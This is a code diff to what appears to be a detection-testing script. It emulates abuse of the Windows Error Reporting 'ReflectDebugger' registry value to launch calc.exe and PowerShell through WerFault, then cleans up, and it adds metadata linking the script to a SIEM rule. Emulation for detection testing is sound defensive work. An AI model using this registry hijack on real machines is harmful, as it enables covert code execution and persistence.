@@ -12,31 +12,61 @@
 import time
 
 from . import common
+from . import RtaMetadata
 
 MY_APP = common.get_path("bin", "myapp.exe")
 
 
-@common.requires_os(common.WINDOWS)
+metadata = RtaMetadata(
+    uuid="cbd90dde-02f4-4010-b654-ccabff3c3c73",
+    platforms=["windows"],
+    endpoint=[],
+    siem=[{"rule_id": "ac5012b8-8da8-440b-aaaf-aedafdea2dff", "rule_name": "Suspicious WerFault Child Process"}],
+    techniques=["T1036"],
+)
+
+
+@common.requires_os(metadata.platforms)
 @common.dependencies(MY_APP)
 def main():
     reg_key = "'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\hangs'"
     reg_name = "ReflectDebugger"
 
-    commands = ["C:\\Windows\\system32\\calc.exe",
-                "'powershell -c calc.exe'",
-                MY_APP]
+    commands = ["C:\\Windows\\system32\\calc.exe", "'powershell -c calc.exe'", MY_APP]
 
     for command in commands:
         common.log("Setting WerFault reg key to {}".format(command))
-        common.execute(["powershell", "-c", "New-ItemProperty", "-Path", reg_key,
-                        "-Name", reg_name, "-Value", command], wait=False)
+        common.execute(
+            [
+                "powershell",
+                "-c",
+                "New-ItemProperty",
+                "-Path",
+                reg_key,
+                "-Name",
+                reg_name,
+                "-Value",
+                command,
+            ],
+            wait=False,
+        )
         time.sleep(1)
 
         common.log("Running WerFault.exe -pr 1")
         common.execute(["werfault", "-pr", "1"], wait=False)
         time.sleep(2.5)
 
-        common.execute(["powershell", "-c", "Remove-ItemProperty", "-Path", reg_key, "-Name", reg_name])
+        common.execute(
+            [
+                "powershell",
+                "-c",
+                "Remove-ItemProperty",
+                "-Path",
+                reg_key,
+                "-Name",
+                reg_name,
+            ]
+        )
 
     common.log("Cleaning up")
 
@@ -45,5 +75,5 @@ def main():
     common.execute(["taskkill", "/F", "/im", "myapp.exe"])
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     exit(main())
